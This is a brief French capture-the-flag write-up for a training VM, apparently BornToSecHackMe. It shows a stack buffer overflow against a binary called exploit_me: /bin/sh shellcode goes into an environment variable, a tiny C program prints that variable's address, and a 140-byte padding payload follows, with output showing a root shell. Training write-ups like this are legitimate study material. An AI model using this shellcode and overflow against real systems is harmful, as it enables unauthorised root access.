# Branch #3

Note : Pour accéder à cette branche, suivre le writeup #1 jusqu'à avoir accès au compte zaz.

## zaz : Exploit_me (Shellcode)

Cette faille est reservée aux commerciaux startup nation, parce que la ret2libc n'est pas assez disruptive dans le milieu.
En reprenant directement le shellcode utilisé dans mon rainfall :
```
export LIDLCODE=$(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
echo 'void main(){printf("%p\n", getenv("LIDLCODE"));}' > /tmp/lidl9.c; gcc /tmp/lidl9.c -o /tmp/lidl9; chmod 777 /tmp/lidl9; /tmp/lidl9 # 0xbfffff94 here
```
On envoie le payload :
```
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print 'A' * 140 + '\x90\xff\xff\xbf'")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
# whoami
root
```